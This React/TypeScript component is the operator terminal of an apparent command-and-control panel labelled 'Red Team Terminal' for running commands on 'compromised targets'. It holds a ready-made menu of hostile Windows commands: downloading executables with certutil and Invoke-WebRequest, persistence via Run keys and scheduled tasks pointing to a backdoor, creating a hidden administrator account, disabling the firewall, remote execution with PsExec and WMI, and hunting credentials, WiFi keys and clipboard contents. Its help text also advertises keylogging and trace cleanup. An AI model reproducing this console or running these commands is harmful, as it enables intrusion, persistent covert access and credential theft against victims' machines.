import React, { useState, useRef, useEffect, forwardRef, useImperativeHandle } from 'react';
import { Agent } from '../services/agentService';

interface TerminalProps {
  agents: Agent[];
  onSendCommand: (agentId: string, command: string, correlationId: string) => void;  // Update signature
  registerPending?: (taskId: string, agentId: string, historyId: string) => void;
}

export interface TerminalRef {
  applyOutput: (taskId: string, output: string, status: 'success' | 'error') => void;
}

interface CommandHistory {
  id: string;
  timestamp: Date;
  agent: string;
  command: string;
  output: string;
  status: 'pending' | 'success' | 'error';
}

const Terminal = forwardRef<TerminalRef, TerminalProps>(({ agents, onSendCommand, registerPending }, ref) => {
  const [selectedAgent, setSelectedAgent] = useState<string>('');
  const [currentCommand, setCurrentCommand] = useState('');
  const [commandHistory, setCommandHistory] = useState<CommandHistory[]>([]);
  const [isConnected, setIsConnected] = useState(false);
  const [isExecuting, setIsExecuting] = useState(false);
  const [showPowerCommands, setShowPowerCommands] = useState(false);
  const terminalRef = useRef<HTMLDivElement>(null);
  const inputRef = useRef<HTMLInputElement>(null);

  const onlineAgents = agents.filter(agent => agent.status === 'online');

  useEffect(() => {
    if (terminalRef.current) {
      terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
    }
  }, [commandHistory]);

  useEffect(() => {
    if (inputRef.current && isConnected) {
      inputRef.current.focus();
    }
  }, [isConnected, selectedAgent]);

  const addToHistory = (entry: CommandHistory) => {
    setCommandHistory(prev => [...prev, entry]);
  };

  // Expose applyOutput method via ref
  useImperativeHandle(ref, () => ({
    applyOutput: (taskId: string, output: string, status: 'success' | 'error') => {
      setCommandHistory(prev => prev.map(cmd => 
        cmd.id === taskId 
          ? { ...cmd, output, status }
          : cmd
      ));
      setIsExecuting(false);
    }
  }));

  const handleConnect = () => {
    if (selectedAgent) {
      setIsConnected(true);
      const agent = agents.find(a => a.id === selectedAgent);
      addToHistory({
        id: Date.now().toString(),
        timestamp: new Date(),
        agent: agent?.name || 'Unknown',
        command: `[SYSTEM] Connected to ${agent?.name} (${agent?.ipAddress})`,
        output: `🔴 RED TEAM TERMINAL v2.0
Connection established successfully.
Target: ${agent?.name}
IP: ${agent?.ipAddress}
OS: ${agent?.operatingSystem}
Architecture: ${agent?.architecture}
Status: COMPROMISED
Ready for commands...`,
        status: 'success'
      });
    }
  };

  const handleDisconnect = () => {
    setIsConnected(false);
    setSelectedAgent('');
    const agent = agents.find(a => a.id === selectedAgent);
    addToHistory({
      id: Date.now().toString(),
      timestamp: new Date(),
      agent: agent?.name || 'Unknown',
      command: '[SYSTEM] Disconnected',
      output: 'Connection terminated. Session closed.',
      status: 'success'
    });
  };

  const executeCommand = async () => {
    if (!currentCommand.trim() || !selectedAgent || !isConnected) return;

    const agent = agents.find(a => a.id === selectedAgent);
    const correlationId = `cmd_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;  // Generate correlationId
    const commandEntry: CommandHistory = {
      id: correlationId,
      timestamp: new Date(),
      agent: agent?.name || 'Unknown',
      command: currentCommand,
      output: '',
      status: 'pending'
    };

    addToHistory(commandEntry);
    setIsExecuting(true);

    // Register pending command for output mapping
    if (registerPending) {
      registerPending(correlationId, selectedAgent, correlationId);
    }

    // Send command to backend with correlationId
    onSendCommand(selectedAgent, currentCommand, correlationId);

    // Set a timeout for command execution (5 minutes for downloads, 2 minutes for others)
    const timeoutMs = currentCommand.includes('Invoke-WebRequest') || currentCommand.includes('Download') ? 300000 : 120000;
    const timeoutId = setTimeout(() => {
      setCommandHistory(prev => prev.map(cmd => 
        cmd.id === commandEntry.id 
          ? { ...cmd, output: 'Command timeout - no response received', status: 'error' }
          : cmd
      ));
      setIsExecuting(false);
    }, timeoutMs);

    // Store timeout ID for potential cleanup
    (commandEntry as any).timeoutId = timeoutId;

    setCurrentCommand('');
  };

  const getSimulatedOutput = (command: string): string => {
    const cmd = command.toLowerCase().trim();
    
    if (cmd === 'help') {
      return `🔴 AVAILABLE COMMANDS:
whoami          - Display current user
systeminfo      - Display system information
dir [path]      - List directory contents
tasklist        - List running processes
netstat -an     - Display network connections
ipconfig        - Display network configuration
screenshot      - Take a screenshot
download [file] - Download file from target
upload [file]   - Upload file to target
keylog start    - Start keylogger
keylog stop     - Stop keylogger
persistence     - Install persistence
cleanup         - Remove traces
shell           - Interactive shell access`;
    }
    
    if (cmd === 'tasklist') {
      return `Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          8 K
System                           4 Services                   0        284 K
smss.exe                       348 Services                   0      1,024 K
csrss.exe                      424 Services                   0      4,096 K
winlogon.exe                   448 Console                    1      2,048 K
services.exe                   492 Services                   0      3,072 K
lsass.exe                      504 Services                   0      6,144 K
explorer.exe                  1234 Console                    1     15,360 K`;
    }
    
    if (cmd === 'ipconfig') {
      return `Windows IP Configuration

Ethernet adapter Ethernet:
   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.1.100
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.1.1

Wireless LAN adapter Wi-Fi:
   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 10.0.0.50
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.0.0.1`;
    }
    
    if (cmd === 'screenshot') {
      return `[+] Screenshot captured successfully
[+] Saved as: screenshot_${Date.now()}.png
[+] File size: 1.2 MB
[+] Resolution: 1920x1080
[+] Upload initiated...
[+] File available in downloads section`;
    }
    
    if (cmd.startsWith('keylog')) {
      if (cmd.includes('start')) {
        return `[+] Keylogger started successfully
[+] Logging to: keylog_${Date.now()}.txt
[+] Stealth mode: ENABLED
[+] Capture rate: 100%`;
      } else {
        return `[+] Keylogger stopped
[+] Session duration: 15m 32s
[+] Keys captured: 1,247
[+] Log file ready for download`;
      }
    }
    
    return `Command executed successfully on ${agents.find(a => a.id === selectedAgent)?.name}`;
  };

  const handleKeyPress = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter') {
      executeCommand();
    }
  };

  const clearTerminal = () => {
    setCommandHistory([]);
  };

  const quickCommands = [
    { label: 'System Info', command: 'systeminfo', icon: '🖥️' },
    { label: 'Process List', command: 'tasklist', icon: '📋' },
    { label: 'Network Config', command: 'ipconfig', icon: '🌐' },
    { label: 'Screenshot', command: 'screenshot', icon: '📸' },
    { label: 'Keylogger Start', command: 'keylog start', icon: '⌨️' },
    { label: 'Help', command: 'help', icon: '❓' }
  ];

  const powerCommands = [
    // System Information & Reconnaissance
    { category: 'System Info', commands: [
      { label: 'System Information', command: 'systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"', icon: '🖥️' },
      { label: 'Hardware Info', command: 'wmic computersystem get model,name,manufacturer,systemtype', icon: '⚙️' },
      { label: 'CPU Info', command: 'wmic cpu get name,numberofcores,numberoflogicalprocessors', icon: '🔧' },
      { label: 'Memory Info', command: 'wmic memorychip get capacity,speed,manufacturer', icon: '💾' },
      { label: 'Disk Info', command: 'wmic logicaldisk get size,freespace,caption', icon: '💿' },
      { label: 'Network Adapters', command: 'wmic path win32_networkadapter get name,netconnectionstatus', icon: '🌐' }
    ]},
    
    // Network & Connectivity
    { category: 'Network', commands: [
      { label: 'IP Configuration', command: 'ipconfig /all', icon: '🌍' },
      { label: 'Network Connections', command: 'netstat -an', icon: '🔗' },
      { label: 'Active Connections', command: 'netstat -b', icon: '📡' },
      { label: 'Routing Table', command: 'route print', icon: '🛣️' },
      { label: 'ARP Table', command: 'arp -a', icon: '📋' },
      { label: 'DNS Cache', command: 'ipconfig /displaydns', icon: '🔍' },
      { label: 'Ping Google', command: 'ping -n 4 8.8.8.8', icon: '📶' },
      { label: 'Traceroute', command: 'tracert google.com', icon: '🗺️' }
    ]},
    
    // Process & Service Management
    { category: 'Processes', commands: [
      { label: 'Running Processes', command: 'tasklist /fo table', icon: '📋' },
      { label: 'Process Tree', command: 'wmic process get name,parentprocessid,processid', icon: '🌳' },
      { label: 'Services List', command: 'sc query', icon: '⚙️' },
      { label: 'Startup Programs', command: 'wmic startup get caption,command', icon: '🚀' },
      { label: 'Kill Process by Name', command: 'taskkill /f /im notepad.exe', icon: '❌' },
      { label: 'Kill Process by PID', command: 'taskkill /f /pid 1234', icon: '🔫' }
    ]},
    
    // File Operations & Downloads
    { category: 'File Operations', commands: [
      { label: 'List Directory', command: 'dir /a', icon: '📁' },
      { label: 'List Hidden Files', command: 'dir /ah', icon: '👁️' },
      { label: 'Find Files by Extension', command: 'dir /s *.txt', icon: '🔍' },
      { label: 'Download File (PowerShell)', command: 'powershell -c "Invoke-WebRequest -Uri \'http://example.com/file.exe\' -OutFile \'C:\\temp\\file.exe\'"', icon: '⬇️' },
      { label: 'Download File (Certutil)', command: 'certutil -urlcache -split -f http://example.com/file.exe C:\\temp\\file.exe', icon: '📥' },
      { label: 'Copy File', command: 'copy "source.txt" "destination.txt"', icon: '📄' },
      { label: 'Move File', command: 'move "source.txt" "C:\\destination\\"', icon: '📦' },
      { label: 'Delete File', command: 'del "filename.txt"', icon: '🗑️' }
    ]},
    
    // User & Security
    { category: 'Users & Security', commands: [
      { label: 'Current User', command: 'whoami', icon: '👤' },
      { label: 'User Privileges', command: 'whoami /priv', icon: '🔐' },
      { label: 'Local Users', command: 'net user', icon: '👥' },
      { label: 'Local Groups', command: 'net localgroup', icon: '👨‍👩‍👧‍👦' },
      { label: 'Logged On Users', command: 'quser', icon: '🔓' },
      { label: 'Password Policy', command: 'net accounts', icon: '🔒' },
      { label: 'Security Events', command: 'wevtutil qe Security /c:10 /rd:true /f:text', icon: '🛡️' }
    ]},
    
    // Registry & System Configuration
    { category: 'Registry', commands: [
      { label: 'Registry Query', command: 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion"', icon: '📚' },
      { label: 'Installed Programs', command: 'wmic product get name,version', icon: '📦' },
      { label: 'Environment Variables', command: 'set', icon: '🌍' },
      { label: 'System Uptime', command: 'wmic os get lastbootuptime', icon: '⏰' },
      { label: 'Windows Version', command: 'ver', icon: '🪟' }
    ]},
    
    // Remote Execution & Advanced
    { category: 'Remote Execution', commands: [
      { label: 'PowerShell Command', command: 'powershell -c "Get-Process"', icon: '⚡' },
      { label: 'Execute Remote PS', command: 'powershell -c "Invoke-Command -ComputerName TARGET -ScriptBlock {Get-Process}"', icon: '🔮' },
      { label: 'WMI Remote Execute', command: 'wmic /node:TARGET process call create "cmd.exe /c dir"', icon: '🎯' },
      { label: 'PsExec Remote', command: 'psexec \\\\TARGET -u username -p password cmd', icon: '🚀' },
      { label: 'Remote Desktop Enable', command: 'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f', icon: '🖥️' },
      { label: 'Firewall Disable', command: 'netsh advfirewall set allprofiles state off', icon: '🔥' }
    ]},
    
    // Persistence & Backdoors
    { category: 'Persistence', commands: [
      { label: 'Add Startup Registry', command: 'reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "MyApp" /t REG_SZ /d "C:\\path\\to\\backdoor.exe"', icon: '🔄' },
      { label: 'Create Scheduled Task', command: 'schtasks /create /tn "MyTask" /tr "C:\\path\\to\\backdoor.exe" /sc onlogon', icon: '⏲️' },
      { label: 'Add User Account', command: 'net user hacker password123 /add', icon: '👤' },
      { label: 'Add to Administrators', command: 'net localgroup administrators hacker /add', icon: '👑' },
      { label: 'Hide User Account', command: 'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /v hacker /t REG_DWORD /d 0', icon: '👻' }
    ]},
    
    // Data Exfiltration
    { category: 'Data Exfiltration', commands: [
      { label: 'Find Sensitive Files', command: 'dir /s /b C:\\ | findstr /i "password\\|credential\\|secret\\|key"', icon: '🔍' },
      { label: 'Browser Passwords', command: 'dir /s /b "%USERPROFILE%" | findstr /i "login\\|password"', icon: '🌐' },
      { label: 'WiFi Passwords', command: 'netsh wlan show profiles', icon: '📶' },
      { label: 'Export WiFi Password', command: 'netsh wlan show profile "WIFI_NAME" key=clear', icon: '🔑' },
      { label: 'Clipboard Content', command: 'powershell -c "Get-Clipboard"', icon: '📋' },
      { label: 'Recent Documents', command: 'dir "%USERPROFILE%\\Recent" /od', icon: '📄' }
    ]}
  ];

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="bg-black/40 border border-red-500/20 rounded-lg p-6 backdrop-blur-sm">
        <h2 className="text-2xl font-bold text-red-400 mb-2 flex items-center">
          <span className="mr-2">💻</span>REMOTE TERMINAL
          <span className="ml-4 text-sm bg-red-600/20 px-2 py-1 rounded border border-red-500/30">
            {isConnected ? '🟢 CONNECTED' : '🔴 DISCONNECTED'}
          </span>
        </h2>
        <p className="text-gray-400">Execute commands remotely on compromised targets</p>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-4 gap-6">
        {/* Agent Selector & Quick Commands */}
        <div className="lg:col-span-1 space-y-4">
          {/* Agent Selection */}
          <div className="bg-black/40 border border-red-500/20 rounded-lg backdrop-blur-sm">
            <div className="p-4 border-b border-red-500/20">
              <h3 className="text-red-400 font-bold flex items-center">
                <span className="mr-2">🎯</span>TARGET SELECTION
              </h3>
            </div>
            <div className="p-4">
              <select
                value={selectedAgent}
                onChange={(e) => setSelectedAgent(e.target.value)}
                className="w-full bg-gray-800 border border-gray-600 rounded px-3 py-2 text-white focus:border-red-500 focus:outline-none"
                disabled={isConnected}
              >
                <option value="">Select Target...</option>
                {onlineAgents.map((agent) => (
                  <option key={agent.id} value={agent.id}>
                    {agent.name} ({agent.ipAddress})
                  </option>
                ))}
              </select>
              
              <div className="mt-4 space-y-2">
                {!isConnected ? (
                  <button
                    onClick={handleConnect}
                    disabled={!selectedAgent}
                    className="w-full bg-green-600 hover:bg-green-700 disabled:bg-gray-600 disabled:cursor-not-allowed text-white font-bold py-2 px-4 rounded transition-colors"
                  >
                    🔗 CONNECT
                  </button>
                ) : (
                  <button
                    onClick={handleDisconnect}
                    className="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-4 rounded transition-colors"
                  >
                    ❌ DISCONNECT
                  </button>
                )}
              </div>

              {selectedAgent && (
                <div className="mt-4 p-3 bg-gray-800/50 rounded border border-gray-700/30">
                  {(() => {
                    const agent = agents.find(a => a.id === selectedAgent);
                    return agent ? (
                      <div className="text-sm space-y-1">
                        <div className="text-red-400 font-semibold">{agent.name}</div>
                        <div className="text-gray-300">IP: {agent.ipAddress}</div>
                        <div className="text-gray-300">OS: {agent.operatingSystem}</div>
                        <div className="text-gray-300">Arch: {agent.architecture}</div>
                        <div className={`text-sm ${agent.status === 'Online' ? 'text-green-400' : 'text-red-400'}`}>
                          Status: {agent.status}
                        </div>
                      </div>
                    ) : null;
                  })()}
                </div>
              )}
            </div>
          </div>

          {/* Quick Commands */}
          <div className="bg-black/40 border border-red-500/20 rounded-lg backdrop-blur-sm">
            <div className="p-4 border-b border-red-500/20">
              <h3 className="text-red-400 font-bold flex items-center">
                <span className="mr-2">⚡</span>QUICK COMMANDS
              </h3>
            </div>
            <div className="p-4 space-y-2">
              {quickCommands.map((cmd, index) => (
                <button
                  key={index}
                  onClick={() => setCurrentCommand(cmd.command)}
                  disabled={!isConnected}
                  className="w-full text-left p-2 rounded text-sm bg-gray-800/50 hover:bg-red-900/10 border border-gray-700/30 text-gray-300 hover:text-white transition-colors disabled:opacity-50 disabled:cursor-not-allowed flex items-center"
                >
                  <span className="mr-2">{cmd.icon}</span>
                  {cmd.label}
                </button>
              ))}
            </div>
          </div>
        </div>

        {/* Terminal */}
        <div className="lg:col-span-3">
          <div className="bg-black/60 border border-red-500/20 rounded-lg backdrop-blur-sm overflow-hidden">
            {/* Terminal Header */}
            <div className="bg-gray-900/80 border-b border-red-500/20 p-4 flex items-center justify-between">
              <div className="flex items-center space-x-4">
                <div className="flex space-x-2">
                  <div className="w-3 h-3 rounded-full bg-red-500"></div>
                  <div className="w-3 h-3 rounded-full bg-yellow-500"></div>
                  <div className="w-3 h-3 rounded-full bg-green-500"></div>
                </div>
                <span className="text-red-400 font-bold">
                  {selectedAgent ? agents.find(a => a.id === selectedAgent)?.name : 'No Target'} - Terminal
                </span>
              </div>
              <div className="flex space-x-2">
                <button
                  onClick={clearTerminal}
                  className="px-3 py-1 bg-yellow-600 hover:bg-yellow-700 text-white rounded text-sm font-semibold transition-colors"
                >
                  CLEAR
                </button>
                {isConnected && (
                  <button
                    onClick={handleDisconnect}
                    className="px-3 py-1 bg-red-600 hover:bg-red-700 text-white rounded text-sm font-semibold transition-colors"
                  >
                    DISCONNECT
                </button>
                )}
              </div>
            </div>

            {/* Terminal Content */}
            <div 
              ref={terminalRef}
              className="h-96 overflow-y-auto p-4 font-mono text-sm bg-black/80"
            >
              {!isConnected && commandHistory.length === 0 && (
                <div className="text-red-400 mb-4">
                  <div>🔴 RED TEAM TERMINAL v2.0</div>
                  <div>Select a target and connect to begin remote access</div>
                  <div className="border-b border-gray-700 my-2"></div>
                </div>
              )}

              {/* Command History */}
              {commandHistory.map((cmd) => (
                <div key={cmd.id} className="mb-4">
                  <div className="flex items-center text-red-400 mb-1">
                    <span className="mr-2">[{cmd.timestamp.toLocaleTimeString()}]</span>
                    <span className="text-yellow-400">{cmd.agent}</span>
                    <span className="mx-2">$</span>
                    <span className="text-white">{cmd.command}</span>
                  </div>
                  {cmd.status === 'pending' ? (
                    <div className="text-yellow-400 ml-6 animate-pulse flex items-center">
                      <span className="mr-2">⏳</span>Executing...
                    </div>
                  ) : (
                    <pre className="text-gray-300 ml-6 whitespace-pre-wrap">{cmd.output}</pre>
                  )}
                </div>
              ))}

              {/* Current Command Line */}
              {isConnected && (
                <div className="flex items-center text-red-400">
                  <span className="mr-2">[{new Date().toLocaleTimeString()}]</span>
                  <span className="text-yellow-400">{agents.find(a => a.id === selectedAgent)?.name}</span>
                  <span className="mx-2">$</span>
                  <input
                    ref={inputRef}
                    type="text"
                    value={currentCommand}
                    onChange={(e) => setCurrentCommand(e.target.value)}
                    onKeyPress={handleKeyPress}
                    disabled={isExecuting}
                    className="flex-1 bg-transparent text-white outline-none font-mono"
                    placeholder="Enter command..."
                  />
                  {isExecuting && (
                    <span className="ml-2 text-yellow-400 animate-spin">⏳</span>
                  )}
                </div>
              )}
            </div>

            {/* Terminal Footer */}
            <div className="bg-gray-900/80 border-t border-red-500/20 p-3 flex items-center justify-between text-sm">
              <div className="flex items-center space-x-4 text-gray-400">
                <span>Status: {isConnected ? '🟢 Connected' : '🔴 Disconnected'}</span>
                <span>Commands: {commandHistory.length}</span>
                <span>Target: {selectedAgent ? agents.find(a => a.id === selectedAgent)?.name : 'None'}</span>
              </div>
              <div className="flex items-center space-x-2">
                {/* Command + Option Dropdown */}
                <div className="relative">
                  <button
                    onClick={() => setShowPowerCommands(!showPowerCommands)}
                    className="px-3 py-1 bg-purple-600 hover:bg-purple-700 text-white rounded font-semibold transition-colors flex items-center space-x-1"
                    title="Command + Option - Power Commands"
                  >
                    <span>⌘</span>
                    <span>+</span>
                    <span>⌥</span>
                  </button>
                  
                  {showPowerCommands && (
                    <div className="absolute bottom-full right-0 mb-2 w-96 max-h-96 overflow-y-auto bg-black/95 border border-red-500/30 rounded-lg shadow-2xl backdrop-blur-sm z-50">
                      <div className="p-3 border-b border-red-500/20">
                        <h3 className="text-red-400 font-bold text-sm flex items-center">
                          <span className="mr-2">⚡</span>POWER COMMANDS
                        </h3>
                        <p className="text-gray-400 text-xs mt-1">Click to copy command to input</p>
                      </div>
                      
                      <div className="max-h-80 overflow-y-auto">
                        {powerCommands.map((category, categoryIndex) => (
                          <div key={categoryIndex} className="border-b border-gray-800/50 last:border-b-0">
                            <div className="p-2 bg-gray-900/50 text-yellow-400 font-semibold text-xs uppercase tracking-wide">
                              {category.category}
                            </div>
                            <div className="space-y-1 p-2">
                              {category.commands.map((cmd, cmdIndex) => (
                                <button
                                  key={cmdIndex}
                                  onClick={() => {
                                    setCurrentCommand(cmd.command);
                                    setShowPowerCommands(false);
                                    inputRef.current?.focus();
                                  }}
                                  className="w-full text-left p-2 rounded text-xs bg-gray-800/30 hover:bg-red-900/20 border border-gray-700/30 text-gray-300 hover:text-white transition-colors flex items-start space-x-2"
                                >
                                  <span className="text-sm flex-shrink-0 mt-0.5">{cmd.icon}</span>
                                  <div className="flex-1 min-w-0">
                                    <div className="font-medium text-white">{cmd.label}</div>
                                    <div className="text-gray-400 font-mono text-xs truncate">{cmd.command}</div>
                                  </div>
                                </button>
                              ))}
                            </div>
                          </div>
                        ))}
                      </div>
                      
                      <div className="p-2 border-t border-red-500/20 bg-gray-900/50">
                        <button
                          onClick={() => setShowPowerCommands(false)}
                          className="w-full px-2 py-1 bg-red-600/20 hover:bg-red-600/30 text-red-400 rounded text-xs font-medium transition-colors"
                        >
                          Close
                        </button>
                      </div>
                    </div>
                  )}
                </div>
                
                <button
                  onClick={executeCommand}
                  disabled={!currentCommand.trim() || isExecuting || !isConnected}
                  className="px-3 py-1 bg-green-600 hover:bg-green-700 disabled:bg-gray-600 disabled:cursor-not-allowed text-white rounded font-semibold transition-colors"
                >
                  EXECUTE
                </button>
              </div>
            </div>
          </div>

          {/* Terminal Stats */}
          <div className="grid grid-cols-1 md:grid-cols-4 gap-4 mt-4">
            <div className="bg-black/40 border border-red-500/20 rounded-lg p-4 backdrop-blur-sm">
              <div className="text-red-400 font-bold text-sm">ONLINE TARGETS</div>
              <div className="text-2xl font-bold text-white">{onlineAgents.length}</div>
            </div>
            <div className="bg-black/40 border border-red-500/20 rounded-lg p-4 backdrop-blur-sm">
              <div className="text-red-400 font-bold text-sm">COMMANDS EXECUTED</div>
              <div className="text-2xl font-bold text-white">{commandHistory.length}</div>
            </div>
            <div className="bg-black/40 border border-red-500/20 rounded-lg p-4 backdrop-blur-sm">
              <div className="text-red-400 font-bold text-sm">SUCCESS RATE</div>
              <div className="text-2xl font-bold text-green-400">
                {commandHistory.length > 0 ? Math.round((commandHistory.filter(c => c.status === 'success').length / commandHistory.length) * 100) : 0}%
              </div>
            </div>
            <div className="bg-black/40 border border-red-500/20 rounded-lg p-4 backdrop-blur-sm">
              <div className="text-red-400 font-bold text-sm">ACTIVE SESSION</div>
              <div className="text-2xl font-bold text-white">{isConnected ? '1' : '0'}</div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
});

Terminal.displayName = 'Terminal';

export default Terminal;